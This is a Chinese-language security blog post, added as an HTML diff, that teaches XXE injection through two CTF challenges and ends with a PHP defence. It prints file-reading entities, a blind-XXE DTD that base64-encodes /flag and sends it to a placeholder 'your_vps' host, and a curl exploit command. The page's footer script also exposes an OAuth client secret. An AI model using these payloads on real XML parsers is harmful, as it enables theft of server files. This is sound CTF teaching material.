@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <title>
+        
+            从两道CTF题目学习XXE漏洞
+        
+    </title>
+    <link rel="icon" href="/img/favicon.png">
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <link rel="stylesheet" href="/css/hljs.min.css">
+    <script src="/js/hljs.min.js"></script>  
+    <script src="/js/gitment.browser.js"></script>  
+</head>
+<body>
+    <header class="header" id="header">
+    <h1>
+        <a class="title" href="/">
+            Hpdoger
+        </a>
+    </h1>
+    <h2>
+        <a class="motto">
+            Ponyo loves Sōsuke!
+        </a>
+    </h2>
+    <nav class="navbar">
+        <ul class="menu">
+            
+            
+                <li class="menu-item">
+                    <a href="/" class="menu-item-link">
+                        Home
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/archives/" class="menu-item-link">
+                        Archives
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/about/" class="menu-item-link">
+                        About
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="https://github.com/Hpd0ger" class="menu-item-link">
+                        Github
+                    </a>
+                </li>
+            
+                
+            
+                <li class="menu-item">
+                    <a href="/atom.xml" class="menu-item-link">
+                        RSS
+                    </a>
+                </li>
+            
+                
+            
+                
+                
+                <li class="menu-item">
+                    <a class="menu-item-link search">
+                        Search                   
+                        <i class="fa fa-long-arrow-right search-icon" aria-hidden="true"></i>
+                    </a>
+                        <input placeholder="Search..." class="search-input" style="display:none;border:none!important;" onkeydown="onEnter(event)" onkeypress="onEnter(event)">
+                </li>
+                
+        </ul>
+    </nav>
+</header>
+    <main class="main">
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/01/07/从两道CTF题目学习XXE漏洞/"> 
+                    从两道CTF题目学习XXE漏洞 
+                </a>
+            </h1>
+            <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-01-07   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
+            </div>
+<div class="toc">
+  <ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#从两道CTF题目学习XXE漏洞"><span class="toc-list-text">从两道CTF题目学习XXE漏洞</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#XML相关知识"><span class="toc-list-text">XML相关知识</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#什么是XML"><span class="toc-list-text">什么是XML</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#什么是实体"><span class="toc-list-text">什么是实体</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#内部实体"><span class="toc-list-text">内部实体</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#外部实体"><span class="toc-list-text">外部实体</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#参数实体"><span class="toc-list-text">参数实体</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#什么是DTD"><span class="toc-list-text">什么是DTD</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#内部声明DTD"><span class="toc-list-text">内部声明DTD</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#外部声明DTD"><span class="toc-list-text">外部声明DTD</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#XXE"><span class="toc-list-text">XXE</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#有回显的XXE"><span class="toc-list-text">有回显的XXE</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#35CTF-Blind-XXE"><span class="toc-list-text">35CTF Blind XXE</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#代码分析"><span class="toc-list-text">代码分析</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#POC"><span class="toc-list-text">POC</span></a></li></ol></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#题外话"><span class="toc-list-text">题外话</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#关于FUZZ"><span class="toc-list-text">关于FUZZ</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#关于XXE漏洞挖掘"><span class="toc-list-text">关于XXE漏洞挖掘</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#关于防御"><span class="toc-list-text">关于防御</span></a></li></ol></li></ol>
+</div>
+            <div class="content">
+                <h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p>
+<h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
+<p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p>
+<h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p>
+<ul>
+<li>内置实体 (Built-in entities)</li>
+<li>字符实体 (Character entities)</li>
+<li>通用实体 (General entities)</li>
+<li>参数实体 (Parameter entities)</li>
+</ul>
+<p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p>
+<h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p>
+<p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p>
+<h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p>
+<p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p>
+<p>关于外部实体引用file协议的例子如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部引入参数实体的例子：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p>
+<h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
+<p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p>
+<h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p>
+<p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p>
+<p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p>
+<p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p>
+<p><strong>PS：#PCDATA的意思是解析字符数据</strong></p>
+<h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p>
+<p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p>
+<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p>
+<p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p>
+<h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p>
+<p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p>
+<p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p>
+<h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p>
+<h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  function __autoload($cls) &#123;</span><br><span class="line">    include $cls;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Black &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  class Green &#123;</span><br><span class="line">    public function __construct($string, $default, $keyword, $store) &#123;</span><br><span class="line">      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);</span><br><span class="line">      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);</span><br><span class="line"></span><br><span class="line">      if ($store) &#123;</span><br><span class="line">            setcookie(&apos;theme&apos;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &apos;/&apos;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if ($_=@$_GET[&apos;theme&apos;]) &#123;</span><br><span class="line">    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) &#123;</span><br><span class="line">      if (@class_exists($_)) &#123;</span><br><span class="line">        ($string = @$_GET[&apos;string&apos;]) || $string = false;</span><br><span class="line">        ($default = @$_GET[&apos;default&apos;]) || $default = false;</span><br><span class="line">        ($keyword = @$_GET[&apos;keyword&apos;]) || $keyword = false;</span><br><span class="line"></span><br><span class="line">        new $_($string, $default, $keyword, @$_GET[&apos;store&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_COOKIE[&apos;theme&apos;]) &#123;</span><br><span class="line">    $args = explode(&apos;-&apos;, $_);</span><br><span class="line">    if (class_exists($args[0])) &#123;</span><br><span class="line">      new $args[0]($args[1], $args[2], $args[3], &apos;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else if ($_=@$_GET[&apos;info&apos;]) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+
+<p>关于代码逻辑部分简单说一下：</p>
+<p>theme、string、default、keyword参数决定cookie，如果cookie存在则对cookie的四个参数以“-”号分割处理：把第一部分当作类名、其余三部分当作初始参数进行实例化。</p>
+<p>__autoload()方法没什么用，因为php7.2+以后此方法被废弃了，而环境刚好是7.21，所以是出题人用来混淆的。</p>
+<p>既然代码没什么可用的类，就看看能不能实例化可以用的php原生类，这里复盘，SimpleXMlElement可用</p>
+<p>关于这个类的具体使用介绍：<a href="http://php.net/manual/zh/class.simplexmlelement.php" target="_blank" rel="noopener">http://php.net/manual/zh/class.simplexmlelement.php</a></p>
+<p>这里仅仅大致用法：<br><img src="https://upload-images.jianshu.io/upload_images/9113969-80306fef674a47a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/9113969-8f4614644b563b5f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt></p>
+<p>所以思路就是Blind XXE，让服务器远程解析我们服务器上的xml，获取的数据再次发送到我们的服务器上。</p>
+<p>一开始构造xml的poc花了半天时间，主要踩了两个坑：</p>
+<p>1、在内部DTD声明中，参数实体不能嵌套参数实体使用，即下方的用法是不允许的，：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % file &quot;hpdoger&quot;&gt;</span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://vps/?file=%file;&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>只能引入外部声明DTD才能进行<strong>参数实体嵌套使用</strong>，但是嵌套使用还必须满足下面的一个条件</p>
+<p>2、 这点是key师傅点播到的：在引入外部DTD声明之后，想要嵌套其它参数实体就必须要用一个“中间参数实体”去搭桥，这个中间参数实体可以理解为eval。具体实现方法看下面的POC</p>
+<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p>vps上的xml文件如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % send SYSTEM &apos;http://your_vps/test2.dtd&apos;&gt;</span><br><span class="line"></span><br><span class="line">%send;</span><br><span class="line">%test;</span><br><span class="line">%back;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>vps上的外部DTD声明文件test2.dtd如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % test &quot;&lt;!ENTITY &amp;#37; back SYSTEM &apos;http://your_vps/?file=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用Curl发送请求，–cookie指定请求cookie参数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v --cookie &quot;theme=SimpleXMlElement-http://your_vps/xxe.xml-2-true&quot; &quot;http://35.207.132.47:82&quot;</span><br></pre></td></tr></table></figure>
+
+<p>查看web日志即能看到base64加密的flag<br><img src="https://i.loli.net/2019/01/06/5c31fa6b43153.png" alt></p>
+<p>其中：</p>
+<ul>
+<li>外部实体send引入外部DTD声明</li>
+<li>参数实体test即为“中间参数实体”</li>
+<li>&#37;为了避免编码问题</li>
+<li>base64-encode是防止文件内容有空格导致http传输时被截断</li>
+</ul>
+<h1 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h1><h2 id="关于FUZZ"><a href="#关于FUZZ" class="headerlink" title="关于FUZZ"></a>关于FUZZ</h2><p>关于服务端接收请求，如果已经有lnmp的环境最好。没有的话，这里推荐两个项目：</p>
+<ol>
+<li><p>TheTwitchy:<a href="https://github.com/TheTwitchy/xxer" target="_blank" rel="noopener">https://github.com/TheTwitchy/xxer</a></p>
+</li>
+<li><p>docker快速搭建lnmp+ssh(自己的项目求start:):</p>
+</li>
+</ol>
+<p><a href="https://github.com/Hpd0ger/docker-lnmp" target="_blank" rel="noopener">https://github.com/Hpd0ger/docker-lnmp</a></p>
+<h2 id="关于XXE漏洞挖掘"><a href="#关于XXE漏洞挖掘" class="headerlink" title="关于XXE漏洞挖掘"></a>关于XXE漏洞挖掘</h2><p>XML作为介质传输流程应该是这样的：</p>
+<p>用户传输敏感数据-&gt;xml形式传输-&gt;后端解析xml(loadXML)-&gt;将各DOM节点转化为SimpleXML节点(最终为数组形式，节点名为键名，节点值为键值)-&gt;提取对应节点键值-&gt;数据提取/用户判断</p>
+<p>漏洞点就在后端解析xml。</p>
+<p>当后端使用<strong>loadXML()</strong>的方法解析xml文档时，会解析恶意xml语句即外部实体的引用，从而造成漏洞。</p>
+<p>在挖掘漏洞的时候尤其注意两点：</p>
+<ol>
+<li>content-type: application/xml</li>
+<li>xml形式的数据传输e.g:<code>&lt;user&gt;admin&lt;/user&gt;</code></li>
+</ol>
+<h2 id="关于防御"><a href="#关于防御" class="headerlink" title="关于防御"></a>关于防御</h2><ol>
+<li><p>对于PHP，禁止引用外部实体</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>对于其它语言，其实做好过滤就行了。但是很少见到用xml形式的数据传输了..说多了也没啥用</p>
+</li>
+</ol>
+
+            </div>
+          
+           
+            <div class="copyright">
+                <div class="name">
+                    <a>Author:</a>
+                    <a>Sōsuke</a>
+                </div>
+                <div class="link">
+                    <a>Link:</a>
+                    <a class="permalink" href="https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/">https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/</a>
+                </div>
+                <div class="license">
+                    <a>Statement:</a>
+                    <a>All articles in this blog shall be licensed by CC BY-NC-SA 3.0 CN, unless otherwise stated. Please indicate the provenance!</a>
+                </div>
+            </div>
+            
+
+          
+
+
+</article>
+
+
+<div class="tip">
+<button class="tip-btn">
+    Tip
+</button>
+<div class="tip-img">
+<ul>
+    
+ 
+</ul>
+</div>
+</div>
+
+<div class="more">
+
+    <div class="prev">
+   <a href="/2019/01/09/Code-breaking-medium֮lumenserial/">  Code-breaking-medium之lumenserial</a>
+    </div>
+
+<div></div>
+
+    <div class="next">
+    <a href="/2018/12/21/Code-Breaking-Puzzles WriteUp/"> Code-Breaking-Puzzles WriteUp </a>
+    </div>
+    
+</div>
+
+<div class="bdsharebuttonbox">
+<a href="#" class="bds_weixin fa fa-weixin" data-cmd="weixin" title="分享到微信" style="color:#1cbd8f">
+</a>
+<a href="#" class="bds_tsina fa fa-weibo" data-cmd="tsina" title="分享到新浪微博" style="color:#ff6363">
+</a>
+<a href="#" class="bds_twi fa fa-twitter" data-cmd="twi" title="分享到Twitter" style="color:#00A7EB">
+</a>
+<a href="#" class="bds_fbook fa fa-facebook" data-cmd="fbook" title="分享到Facebook" style="color:#00A7EB">
+</a>
+</div>
+<script>
+window._bd_share_config={
+    "common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},
+    "share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='../../../../../static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+ 
+<div id="comments"></div>
+
+<script>
+    var gitment = new Gitment({
+    id: "Mon Jan 07 2019 00:00:00 GMT+0800",
+    owner: "Hpd0ger",
+    repo: "Hpd0ger.github.io",
+    oauth: {
+      client_id:"8d83609a651e972e308d",
+      client_secret: "37e40c89a47e957f654e86f71c5caaccad0774de",
+    }
+  })
+  gitment.render('comments')
+</script>
+    </main>
+    <a class="not-found">not found!</a>
+    <div class="search-items">
+    </div>
+    <a href="#header" id="top" style="display:none">
+        <i class="fa fa-sort-asc fa-2x"></i>
+    </a>
+    <footer class="footer">
+    <div class="footer-copyright">©️2017
+    <a href="//github.com/Vevlins/toki" class="link" target="_blank">Toki</a>  by Vevlins
+    </div>
+</footer>
+
+    <script src="/js/jquery.js"></script>
+    <script src="/js/toki.js"></script>  
+  <script>hljs.initHighlightingOnLoad();</script>
+</body>
+</html>
